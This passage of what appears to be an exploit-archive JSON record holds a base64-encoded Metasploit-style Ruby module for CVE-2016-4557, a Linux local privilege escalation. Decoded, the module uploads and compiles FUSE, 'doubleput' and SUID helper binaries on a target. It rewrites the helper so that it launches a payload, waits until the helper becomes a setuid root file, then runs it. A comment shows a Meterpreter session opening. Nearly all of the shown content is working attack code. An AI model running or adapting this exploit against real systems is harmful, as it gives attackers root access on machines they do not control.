zdHJ1Y3QgZnVzZV9maWxlX2luZm8gKmZpKSB7DQogICAgICAgIHNsZWVwKDEwKTsNCiAgICAgICAgc2l6ZV90IGxlbiA9IHNpemVvZihkYXRhX3N0YXRlKTsNCiAgICAgICAgaWYgKG9mZnNldCA8IGxlbikgew0KICAgICAgICAgIGlmIChvZmZzZXQgKyBzaXplID4gbGVuKQ0KICAgICAgICAgICAgc2l6ZSA9IGxlbiAtIG9mZnNldDsNCiAgICAgICAgICBtZW1jcHkoYnVmLCBkYXRhX3N0YXRlICsgb2Zmc2V0LCBzaXplKTsNCiAgICAgICAgfSBlbHNlDQogICAgICAgICAgc2l6ZSA9IDA7DQogICAgICAgIHJldHVybiBzaXplOw0KICAgICAgfQ0KDQogICAgICBzdGF0aWMgaW50IGhlbGxvX3dyaXRlKGNvbnN0IGNoYXIgKnBhdGgsIGNvbnN0IGNoYXIgKmJ1Ziwgc2l6ZV90IHNpemUsIG9mZl90IG9mZnNldCwgc3RydWN0IGZ1c2VfZmlsZV9pbmZvICpmaSkgew0KICAgICAgICBpZiAob2Zmc2V0ICE9IDApDQogICAgICAgICAgZXJyeCgxLCAiZ290IHdyaXRlIHdpdGggbm9uemVybyBvZmZzZXQiKTsNCiAgICAgICAgaWYgKHNpemUgIT0gc2l6ZW9mKGRhdGFfc3RhdGUpKQ0KICAgICAgICAgIGVycngoMSwgImdvdCB3cml0ZSB3aXRoIHNpemUgJWQiLCAoaW50KXNpemUpOw0KICAgICAgICBtZW1jcHkoZGF0YV9zdGF0ZSArIG9mZnNldCwgYnVmLCBzaXplKTsNCiAgICAgICAgcmV0dXJuIHNpemU7DQogICAgICB9DQoNCiAgICAgIHN0YXRpYyBzdHJ1Y3QgZnVzZV9vcGVyYXRpb25zIGhlbGxvX29wZXIgPSB7DQogICAgICAgIC5nZXRhdHRyCT0gaGVsbG9fZ2V0YXR0ciwNCiAgICAgICAgLnJlYWRkaXIJPSBoZWxsb19yZWFkZGlyLA0KICAgICAgICAub3BlbgkJPSBoZWxsb19vcGVuLA0KICAgICAgICAucmVhZAkJPSBoZWxsb19yZWFkLA0KICAgICAgICAud3JpdGUJCT0gaGVsbG9fd3JpdGUsDQogICAgICB9Ow0KDQogICAgICBpbnQgbWFpbihpbnQgYXJnYywgY2hhciAqYXJndltdKSB7DQogICAgICAgIHJldHVybiBmdXNlX21haW4oYXJnYywgYXJndiwgJmhlbGxvX29wZXIsIE5VTEwpOw0KICAgICAgfQ0KICAgIH0NCg0KICAgIGhlbGxvX2ZpbGVuYW1lID0gJ2hlbGxvJw0KICAgIGhlbGxvX3BhdGggPSAiI3tkYXRhc3RvcmVbJ1dyaXRhYmxlRGlyJ119LyN7aGVsbG9fZmlsZW5hbWV9Ig0KICAgIGRvdWJsZXB1dF9maWxlID0gIiN7ZGF0YXN0b3JlWydXcml0YWJsZURpciddfS9kb3VibGVwdXQiDQogICAgc3VpZGhlbHBlcl9maWxlbmFtZSA9ICdzdWlkaGVscGVyJw0KICAgIHN1aWRoZWxwZXJfcGF0aCA9ICIje2RhdGFzdG9yZVsnV3JpdGFibGVEaXInXX0vI3tzdWlkaGVscGVyX2ZpbGVuYW1lfSINCiAgICBwYXlsb2FkX2ZpbGVuYW1lID0gcmFuZF90ZXh0X2FscGhhKDgpDQogICAgcGF5bG9hZF9wYXRoID0gIiN7ZGF0YXN0b3JlWydXcml0YWJsZURpciddfS8je3BheWxvYWRfZmlsZW5hbWV9Ig0KDQogICAgaWYgY2hlY2sgIT0gQ2hlY2tDb2RlOjpBcHBlYXJzDQogICAgICBmYWlsX3dpdGgoRmFpbHVyZTo6Tm90VnVsbmVyYWJsZSwgJ1RhcmdldCBub3QgdnVsbmVyYWJsZSEgcHVudCEnKQ0KICAgIGVuZA0KDQogICAgZGVmIGhhc19wcmVyZXFzPygpDQogICAgICBkZWYgY2hlY2tfbGliZnVzZV9kZXY/KCkNCiAgICAgICAgbGliID0gY21kX2V4ZWMoJ2Rwa2cgLS1nZXQtc2VsZWN0aW9ucyB8IGdyZXAgbGliZnVzZS1kZXYnKQ0KICAgICAgICBpZiBsaWIuaW5jbHVkZT8oJ2luc3RhbGwnKQ0KICAgICAgICAgIHZwcmludF9nb29kKCdsaWJmdXNlLWRldiBpcyBpbnN0YWxsZWQnKQ0KICAgICAgICAgIHJldHVybiB0cnVlDQogICAgICAgIGVsc2UNCiAgICAgICAgICBwcmludF9lcnJvcignbGliZnVzZS1kZXYgaXMgbm90IGluc3RhbGxlZC4gIENvbXBpbGluZyB3aWxsIGZhaWwuJykNCiAgICAgICAgICByZXR1cm4gZmFsc2UNCiAgICAgICAgZW5kDQogICAgICBlbmQNCiAgICAgIGRlZiBjaGVja19nY2M/KCkNCiAgICAgICAgZ2NjID0gY21kX2V4ZWMoJ3doaWNoIGdjYycpDQogICAgICAgIGlmIGdjYy5pbmNsdWRlPygnZ2NjJykNCiAgICAgICAgICB2cHJpbnRfZ29vZCgnZ2NjIGlzIGluc3RhbGxlZCcpDQogICAgICAgICAgcmV0dXJuIHRydWUNCiAgICAgICAgZWxzZQ0KICAgICAgICAgIHByaW50X2Vycm9yKCdnY2MgaXMgbm90IGluc3RhbGxlZC4gIENvbXBpbGluZyB3aWxsIGZhaWwuJykNCiAgICAgICAgICByZXR1cm4gZmFsc2UNCiAgICAgICAgZW5kDQogICAgICBlbmQNCiAgICAgIGRlZiBjaGVja19wa2djb25maWc/KCkNCiAgICAgICAgbGliID0gY21kX2V4ZWMoJ2Rwa2cgLS1nZXQtc2VsZWN0aW9ucyB8IGdyZXAgXnBrZy1jb25maWcnKQ0KICAgICAgICBpZiBsaWIuaW5jbHVkZT8oJ2luc3RhbGwnKQ0KICAgICAgICAgIHZwcmludF9nb29kKCdwa2ctY29uZmlnIGlzIGluc3RhbGxlZCcpDQogICAgICAgICAgcmV0dXJuIHRydWUNCiAgICAgICAgZWxzZQ0KICAgICAgICAgIHByaW50X2Vycm9yKCdwa2ctY29uZmlnIGlzIG5vdCBpbnN0YWxsZWQuICBFeHBsb2l0YXRpb24gd2lsbCBmYWlsLicpDQogICAgICAgICAgcmV0dXJuIGZhbHNlDQogICAgICAgIGVuZA0KICAgICAgZW5kDQogICAgICByZXR1cm4gY2hlY2tfbGliZnVzZV9kZXY/KCkgJiYgY2hlY2tfZ2NjPygpICYmIGNoZWNrX3BrZ2NvbmZpZz8oKQ0KICAgIGVuZA0KDQogICAgY29tcGlsZSA9IGZhbHNlDQogICAgaWYgZGF0YXN0b3JlWydDT01QSUxFJ10gPT0gJ0F1dG8nIHx8IGRhdGFzdG9yZVsnQ09NUElMRSddID09ICdUcnVlJw0KICAgICAgaWYgaGFzX3ByZXJlcXM/KCkNCiAgICAgICAgY29tcGlsZSA9IHRydWUNCiAgICAgICAgdnByaW50X3N0YXR1cygnTGl2ZSBjb21waWxpbmcgZXhwbG9pdCBvbiBzeXN0ZW0nKQ0KICAgICAgZWxzZQ0KICAgICAgICB2cHJpbnRfc3RhdHVzKCdEcm9wcGluZyBwcmUtY29tcGlsZWQgZXhwbG9pdCBvbiBzeXN0ZW0nKQ0KICAgICAgZW5kDQogICAgZW5kDQoNCiAgICBpZiBjb21waWxlID09IGZhbHNlDQogICAgICAjIGRvdWJsZXB1dCBmaWxlDQogICAgICBwYXRoID0gOjpGaWxlLmpvaW4oIE1zZjo6Q29uZmlnLmRhdGFfZGlyZWN0b3J5LCAnZXhwbG9pdHMnLCAnQ1ZFLTIwMTYtNDU1NycsICdkb3VibGVwdXQnKQ0KICAgICAgZmQgPSA6OkZpbGUub3BlbiggcGF0aCwgInJiIikNCiAgICAgIGRvdWJsZXB1dCA9IGZkLnJlYWQoZmQuc3RhdC5zaXplKQ0KICAgICAgZmQuY2xvc2UNCiAgICAgICMgaGVsbG8gZmlsZQ0KICAgICAgcGF0aCA9IDo6RmlsZS5qb2luKCBNc2Y6OkNvbmZpZy5kYXRhX2RpcmVjdG9yeSwgJ2V4cGxvaXRzJywgJ0NWRS0yMDE2LTQ1NTcnLCAnaGVsbG8nKQ0KICAgICAgZmQgPSA6OkZpbGUub3BlbiggcGF0aCwgInJiIikNCiAgICAgIGhlbGxvID0gZmQucmVhZChmZC5zdGF0LnNpemUpDQogICAgICBmZC5jbG9zZQ0KICAgICAgIyBzdWlkaGVscGVyIGZpbGUNCiAgICAgIHBhdGggPSA6OkZpbGUuam9pbiggTXNmOjpDb25maWcuZGF0YV9kaXJlY3RvcnksICdleHBsb2l0cycsICdDVkUtMjAxNi00NTU3JywgJ3N1aWRoZWxwZXInKQ0KICAgICAgZmQgPSA6OkZpbGUub3BlbiggcGF0aCwgInJiIikNCiAgICAgIHN1aWRfaGVscGVyID0gZmQucmVhZChmZC5zdGF0LnNpemUpDQogICAgICBmZC5jbG9zZQ0KDQogICAgICAjIG92ZXJ3cml0ZSB3aXRoIHRoZSBoYXJkY29kZWQgdmFyaWFibGUgbmFtZXMgaW4gdGhlIGNvbXBpbGVkIHZlcnNpb25zDQogICAgICBwYXlsb2FkX2ZpbGVuYW1lID0gJ0F5REpTYU1NJw0KICAgICAgcGF5bG9hZF9wYXRoID0gJy90bXAvQXlESlNhTU0nDQogICAgZW5kDQoNCiAgICAjIG1ha2Ugb3VyIHN1YnN0aXR1dGlvbnMgc28gdGhpbmdzIGFyZSBkeW5hbWljDQogICAgc3VpZF9oZWxwZXIuZ3N1YiEoL2V4ZWNsXCgiXC9iaW5cL2Jhc2giLCAiYmFzaCIsIE5VTExcKTsvLA0KICAgICAgICAgICAgICAgInJldHVybiBleGVjbChcIiN7cGF5bG9hZF9wYXRofVwiLCBcIlwiLCBOVUxMKTsiKSAjbGF1bmNoIG91ciBwYXlsb2FkLCBhbmQgZG8gaXQgaW4gYSByZXR1cm4gdG8gbm90IGZyZWV6ZSB0aGUgZXhlY3V0YWJsZQ0KICAgIGRvdWJsZXB1dC5nc3ViISgvZXhlY2xcKCIuXC9zdWlkaGVscGVyIiwgInN1aWRoZWxwZXIiLCBOVUxMXCk7LywNCiAgICAgICAgICAgICAgICAnZXhpdCgwKTsnKQ0KICAgIHByaW50X3N0YXR1cygnV3JpdGluZyBmaWxlcyB0byB0YXJnZXQnKQ0KICAgIGNtZF9leGVjKCJjZCAje2RhdGFzdG9yZVsnV3JpdGFibGVEaXInXX0iKQ0KICAgIHVwbG9hZF9hbmRfY29tcGlsZSgnaGVsbG8nLCBoZWxsb19wYXRoLCBoZWxsbywgY29tcGlsZSA/ICJnY2MgLW8gI3toZWxsb19maWxlbmFtZX0gI3toZWxsb19maWxlbmFtZX0uYyAtV2FsbCAtc3RkPWdudTk5IGBwa2ctY29uZmlnIGZ1c2UgLS1jZmxhZ3MgLS1saWJzYCIgOiBuaWwpDQogICAgdXBsb2FkX2FuZF9jb21waWxlKCdkb3VibGVwdXQnLCBkb3VibGVwdXRfZmlsZSwgZG91YmxlcHV0LCBjb21waWxlID8gImdjYyAtbyAje2RvdWJsZXB1dF9maWxlfSAje2RvdWJsZXB1dF9maWxlfS5jIC1XYWxsIiA6IG5pbCkNCiAgICB1cGxvYWRfYW5kX2NvbXBpbGUoJ3N1aWRoZWxwZXInLCBzdWlkaGVscGVyX3BhdGgsIHN1aWRfaGVscGVyLCBjb21waWxlID8gImdjYyAtbyAje3N1aWRoZWxwZXJfZmlsZW5hbWV9ICN7c3VpZGhlbHBlcl9maWxlbmFtZX0uYyAtV2FsbCIgOiBuaWwpDQogICAgdXBsb2FkX2FuZF9jb21waWxlKCdwYXlsb2FkJywgcGF5bG9hZF9wYXRoLCBnZW5lcmF0ZV9wYXlsb2FkX2V4ZSkNCg0KICAgIHByaW50X3N0YXR1cygnU3RhcnRpbmcgZXhlY3V0aW9uIG9mIHByaXYgZXNjLiAgVGhpcyBtYXkgdGFrZSBhYm91dCAxMjAgc2Vjb25kcycpDQoNCiAgICBjbWRfZXhlYyhkb3VibGVwdXRfZmlsZSkNCiAgICBzZWNfd2FpdGVkID0gMA0KICAgIHVudGlsIHNlY193YWl0ZWQgPiBkYXRhc3RvcmVbJ01BWFdBSVQnXSBkbw0KICAgICAgUmV4LnNsZWVwKDEpDQogICAgICAjIGNoZWNrIGZpbGUgcGVybWlzc2lvbnMNCiAgICAgIGlmIGNtZF9leGVjKCJscyAtbGFoICN7c3VpZGhlbHBlcl9wYXRofSIpLmluY2x1ZGU/KCctcndzci1zci14IDEgcm9vdCByb290JykNCiAgICAgICAgcHJpbnRfZ29vZCgnZ290IHJvb3QsIHN0YXJ0aW5nIHBheWxvYWQnKQ0KICAgICAgICBwcmludF9lcnJvcignVGhpcyBleHBsb2l0IG1heSByZXF1aXJlIHByb2Nlc3Mga2lsbGluZyBvZiBcJ2hlbGxvXCcsIGFuZCBcJ2RvdWJsZXB1dFwnIG9uIHRoZSB0YXJnZXQnKQ0KICAgICAgICBwcmludF9lcnJvcignVGhpcyBleHBsb2l0IG1heSByZXF1aXJlIG1hbnVhbCB1bW91bnRpbmcgb2YgL3RtcC9mdXNlX21vdW50IHZpYSBcJ2Z1c2VybW91bnQgLXogLXUgL3RtcC9mdXNlX21vdW50XCcgb24gdGhlIHRhcmdldCcpDQogICAgICAgIHByaW50X2Vycm9yKCdUaGlzIGV4cGxvaXQgbWF5IHJlcXVpcmUgbWFudWFsIGRlbGV0aW9uIG9mIC90bXAvZnVzZV9tb3VudCB2aWEgXCdybSAtcmYgL3RtcC9mdXNlX21vdW50XCcgb24gdGhlIHRhcmdldCcpDQogICAgICAgIGNtZF9leGVjKCIje3N1aWRoZWxwZXJfcGF0aH0iKQ0KICAgICAgICByZXR1cm4NCiAgICAgIGVuZA0KICAgICAgc2VjX3dhaXRlZCArPTENCiAgICBlbmQNCiAgZW5kDQoNCiAgZGVmIG9uX25ld19zZXNzaW9uKHNlc3Npb24pDQogICAgIyBpZiB3ZSBkb24ndCAvYmluL2Jhc2ggaGVyZSwgb3VyIHBheWxvYWQgdGltZXMgb3V0DQogICAgIyBbKl0gTWV0ZXJwcmV0ZXIgc2Vzc2lvbiAyIG9wZW5lZCAoMTkyLjE2OC4xOTkuMTMxOjQ0NDQgLT4gMTkyLjE2OC4xOTkuMTMwOjM3MDIyKSBhdCAyMDE2LTA5LTI3IDE0OjE1OjA0IC0wNDAwDQogICAgIyBbKl0gMTkyLjE2OC4xOTkuMTMwIC0gTWV0ZXJwcmV0ZXIgc2Vzc2lvbiAyIGNsb3NlZC4gIFJlYXNvbjogRGllZA0KICAgIHNlc3Npb24uc2hlbGxfY29tbWFuZF90b2tlbignL2Jpbi9iYXNoJykNCiAgICBzdXBlcg0KICBlbmQNCmVuZA==", 
    "filename": "platforms/linux/local/40759.rb", 
    "id": "40759", 
    "cves": [
        "CVE-2016-4557"
    ]
}